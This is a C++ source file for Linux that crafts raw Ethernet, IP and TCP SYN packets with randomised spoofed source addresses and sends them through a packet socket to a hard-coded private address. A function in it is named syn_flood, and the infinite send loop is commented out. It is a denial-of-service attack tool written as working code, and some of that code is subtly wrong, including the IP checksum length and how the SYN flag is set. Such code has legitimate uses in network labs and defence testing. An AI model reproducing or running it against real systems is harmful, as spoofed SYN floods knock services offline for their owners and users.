//
// Created by geek on 2022/4/8.
//
#include <sys/socket.h>
#include <netinet/if_ether.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <string>
#include <iostream>
#include <net/if.h>
#include <cstring>
#include <sys/ioctl.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netpacket/packet.h>

using namespace std;

struct ifreq mac_req,ip_req,index_req;
uint8_t dst_mac[] ={0x10,0x51,0x72,0x27,0xb9,0xab}; //config
int raw_socket;
uint32_t src_addr;                              // config
uint32_t dst_addr;                              // config
uint16_t src_port;                              // config
uint16_t dst_port;                              // config
struct sockaddr_ll target_address;




int ethernet_header(uint8_t *buffer,int length)
{
    struct ethhdr* etherhdr = (struct ethhdr* )buffer;
    memcpy(etherhdr->h_source,mac_req.ifr_hwaddr.sa_data,6*sizeof(uint8_t));
    memcpy(etherhdr->h_dest,dst_mac,6*sizeof(uint8_t));
    etherhdr->h_proto = htons(ETHERTYPE_IP);
    return sizeof(struct ethhdr);
}

void ip_header(uint8_t *buffer,int length)
{
}
uint16_t check_sum(uint8_t *buffer,int length)
{
    int res = length;
    int sum = 0;
    uint16_t *w = (uint16_t *)buffer;
    uint16_t answer = 0;

    while (res>1)
    {
        sum+=*w++;
        res-=2;
    }
    if(res==1)
    {
        auto tmp = *(uint8_t*)w;
        sum+=tmp;
    }

    sum = (sum>>16)+(sum&0xffff);
    sum += sum>>16;
    answer = ~sum;
    return  answer;
}

int build_tcp(uint8_t* buffer, int length )
{
    int st = 0;
    // IP
    struct iphdr *ip_header = (struct iphdr *)buffer;
    ip_header->version = IPVERSION;
    ip_header->ihl = 5;
    ip_header->tos = IPTOS_LOWDELAY;
    ip_header->id = htons(10201);
    ip_header->ttl = 64;
    ip_header->protocol = IPPROTO_TCP;
    ip_header->saddr = src_addr;
    ip_header->daddr = dst_addr;
    ip_header->check =  0;

    st += sizeof(struct iphdr);
    // TCP
    struct tcphdr *tcp_header = (struct tcphdr*)(buffer+st);
    tcp_header->source = htons(src_port);
    tcp_header->dest = htons(dst_port);
    tcp_header->seq = random();
    tcp_header->syn = TCP_SYN_SENT;
    tcp_header->check = 0;
    tcp_header->th_off = 5;

    st += sizeof(struct tcphdr);
    // Check
    ip_header->tot_len = htons(sizeof(struct iphdr)+sizeof(struct tcphdr));
    ip_header->check = check_sum((uint8_t*)ip_header,sizeof(ip_header));
    return st;
}



int init(string device)
{
    raw_socket = socket(PF_PACKET,SOCK_RAW, htons(ETH_P_ALL));
    if(raw_socket<0) throw "create socket failed";

    memset(&mac_req,0,sizeof(mac_req));
    memset(&ip_req,0,sizeof(ip_req));
    strncpy(mac_req.ifr_name,device.c_str(),IFNAMSIZ);
    strncpy(ip_req.ifr_name,device.c_str(),IFNAMSIZ);
    strncpy(index_req.ifr_name,device.c_str(),IFNAMSIZ);

    if(ioctl(raw_socket,SIOCGIFHWADDR,&mac_req)<0) throw "ioctl get mac failed";
    if(ioctl(raw_socket,SIOCGIFADDR,&ip_req)<0) throw "ioctl ip address failed";
    if(ioctl(raw_socket,SIOCGIFINDEX,&index_req)<0) throw "ioctl interface index get failed";

    target_address.sll_ifindex = index_req.ifr_ifindex;
    target_address.sll_halen = ETH_ALEN;

    memcpy(target_address.sll_addr,dst_mac,6*sizeof(uint8_t));
}

int syn_flood(uint8_t* buffer,int length)
{
    return build_tcp(buffer, length);
}

int main()
{
    string device = "wlo1";                         // config
    uint8_t buffer[65535];
    int p,length=0;
    int res=65535;
    string string_address = "172.24.75.188";        // config
    srandom(time(NULL));
    try {

        dst_addr = inet_addr(string_address.c_str());
        src_port = 10308;            // config
        memset(buffer,0,sizeof(buffer));
        init(device);
        p = ethernet_header(buffer,res);
        length = length + p;
        res = res - p;

//        while (true)
        {
            auto tmp_length = length;
            src_addr = random();
            dst_port = random();
            p = syn_flood(buffer + tmp_length, res);
            tmp_length = p + tmp_length;
            auto status = sendto(raw_socket, buffer, tmp_length, 0,
                                 (struct sockaddr*)&target_address, sizeof(struct sockaddr_ll));

            cout<<status<<endl;
            if (status <0 ) throw "send message failed";
        }


    }catch (const char* msg)
    {
        cout<<msg;
    }

}
